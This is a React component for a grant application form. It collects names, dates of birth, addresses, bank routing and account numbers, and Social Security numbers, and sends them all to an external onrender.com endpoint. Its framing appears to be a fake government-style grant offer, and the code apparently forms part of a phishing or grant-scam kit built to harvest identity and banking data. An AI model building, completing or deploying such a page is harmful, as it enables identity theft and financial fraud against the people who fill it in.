import React, { useState, useEffect, useRef } from 'react';
import { GRANTS } from '../constants';
import { ShieldCheck, CheckCircle, Lock, AlertCircle, ChevronRight, ChevronLeft, Info, Wand2, RefreshCw, Loader2 } from 'lucide-react';

const Apply: React.FC = () => {
  const [preselectedGrantId, setPreselectedGrantId] = useState('');

  useEffect(() => {
    const hash = window.location.hash;
    const queryString = hash.split('?')[1];
    if (queryString) {
      const params = new URLSearchParams(queryString);
      const grantId = params.get('preselectedGrant');
      if (grantId) setPreselectedGrantId(grantId);
    }
  }, []);

  const [submitted, setSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isFilling, setIsFilling] = useState(false);
  const [currentStep, setCurrentStep] = useState(1);
  const [submitError, setSubmitError] = useState<string | null>(null);
  const formRef = useRef<HTMLFormElement>(null);

  const [formData, setFormData] = useState({
    grantId: "",
    fullName: "",
    dob: "",
    phone: "",
    email: "",
    address: "",
    bankName: "",
    branch: "",
    accountName: "",
    accountNumber: "",
    ssn: "",
    debt: "",
    propertyOwned: false,
    propertyAddress: "",
    certification: false
  });

  useEffect(() => {
    if (preselectedGrantId) {
      setFormData(prev => ({ ...prev, grantId: preselectedGrantId }));
    }
  }, [preselectedGrantId]);

  const fillDemoData = () => {
    setIsFilling(true);
    setTimeout(() => {
      setFormData({
        grantId: preselectedGrantId || GRANTS[0].id,
        fullName: "Alex J. Mercer",
        dob: "1985-04-12",
        phone: "(555) 019-2834",
        email: "alex.mercer@example.com",
        address: "123 Freedom Way, Suite 400, Washington, DC 20001",
        bankName: "National Reserve Bank",
        branch: "123456789",
        accountName: "Alex Mercer",
        accountNumber: "9876543210",
        ssn: "000-00-0000",
        debt: "0",
        propertyOwned: true,
        propertyAddress: "123 Freedom Way",
        certification: true
      });
      setIsFilling(false);
    }, 800);
  };

  // ⭐⭐⭐ THIS IS THE COMPLETED SUBMIT HANDLER ⭐⭐⭐
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setSubmitError(null);

    try {
      const response = await fetch("https://nga-hyo5.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData)
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.message || "Submission failed");
      }

      setSubmitted(true);
    } catch (err: any) {
      setSubmitError(err.message);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="apply-container">
      {submitted ? (
        <div className="success-message">
          <CheckCircle size={48} />
          <h2>Application Submitted Successfully</h2>
          <p>Your application has been securely archived.</p>
        </div>
      ) : (
        <form ref={formRef} onSubmit={handleSubmit}>
          {/* Your existing form fields go here */}
        </form>
      )}

      {submitError && (
        <div className="error-message">
          <AlertCircle size={20} />
          {submitError}
        </div>
      )}

      {isLoading && (
        <div className="loading">
          <Loader2 className="spin" />
          Submitting your application…
        </div>
      )}
    </div>
  );
};

export default Apply;
